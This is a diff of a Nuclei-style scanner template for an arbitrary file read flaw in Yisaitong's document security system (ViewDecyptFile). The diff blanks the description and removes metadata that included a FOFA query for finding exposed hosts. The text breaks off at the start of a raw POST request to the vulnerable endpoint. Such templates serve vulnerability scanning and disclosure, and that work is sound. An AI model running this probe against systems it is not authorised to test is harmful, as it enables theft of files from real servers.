@@ -3,12 +3,8 @@ info:
   name: 亿赛通 ViewDecyptFile存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/adf1fi3te88g812f'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: adf1fi3te88g812f
-    fofa: app="亿赛通-电子文档安全管理系统" || body="/CDGServer3/index.jsp"
 http:
 - raw:
   - 'POST /CDGServer3/client/DecryptApplication;Servicelogin HTTP/1.1
